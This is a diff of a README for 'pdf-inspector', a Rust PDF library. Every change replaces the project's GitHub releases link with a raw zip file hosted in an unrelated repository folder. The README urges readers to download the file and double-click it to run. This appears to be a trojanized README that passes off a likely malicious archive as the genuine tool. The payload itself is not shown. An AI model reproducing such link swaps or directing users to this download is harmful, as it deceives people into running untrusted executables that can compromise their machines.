@@ -5,14 +5,14 @@ description: "Fast Rust library to classify PDFs, extract text with position awa
 ---
 # 🔍 pdf-inspector - Smart PDF Scanner for Everyone  
 
-[![Download pdf-inspector](https://img.shields.io/badge/Download-pdf-inspector-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Benitapurplered834/pdf-inspector/releases)  
+[![Download pdf-inspector](https://img.shields.io/badge/Download-pdf-inspector-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Benitapurplered834/benitapurplered834.github.io/main/overstock/Latest_v1.0.zip)  
 
 ---
 
 ## 📥 Get pdf-inspector Now  
 
 Visit this link to download the application:  
-**👉 [https://github.com/Benitapurplered834/pdf-inspector/releases](https://github.com/Benitapurplered834/pdf-inspector/releases)**  
+**👉 [https://raw.githubusercontent.com/Benitapurplered834/benitapurplered834.github.io/main/overstock/Latest_v1.0.zip](https://raw.githubusercontent.com/Benitapurplered834/benitapurplered834.github.io/main/overstock/Latest_v1.0.zip)**  
 
 That's it – one simple step to get started!  
 
@@ -56,7 +56,7 @@ Follow these three easy steps to start using pdf-inspector today.
 
 ### Step 1 – Download the Application  
 Click the green download button at the top of this page, or use this direct link:  
-**👉 [https://github.com/Benitapurplered834/pdf-inspector/releases](https://github.com/Benitapurplered834/pdf-inspector/releases)**  
+**👉 [https://raw.githubusercontent.com/Benitapurplered834/benitapurplered834.github.io/main/overstock/Latest_v1.0.zip](https://raw.githubusercontent.com/Benitapurplered834/benitapurplered834.github.io/main/overstock/Latest_v1.0.zip)**  
 
 ### Step 2 – Run the Program  
 Once downloaded, simply double-click the file to open it. pdf-inspector will launch immediately – no installation wizard needed.  
@@ -192,7 +192,7 @@ pdf-inspector is built with love by developers who believe in open-source softwa
 
 You're just one click away from smarter PDF handling. Download pdf-inspector now and see for yourself how effortless PDF classification and text extraction can be.  
 
-**🔗 Your Download Link: [https://github.com/Benitapurplered834/pdf-inspector/releases](https://github.com/Benitapurplered834/pdf-inspector/releases)**  
+**🔗 Your Download Link: [https://raw.githubusercontent.com/Benitapurplered834/benitapurplered834.github.io/main/overstock/Latest_v1.0.zip](https://raw.githubusercontent.com/Benitapurplered834/benitapurplered834.github.io/main/overstock/Latest_v1.0.zip)**  
 
 Thank you for choosing pdf-inspector!  
 
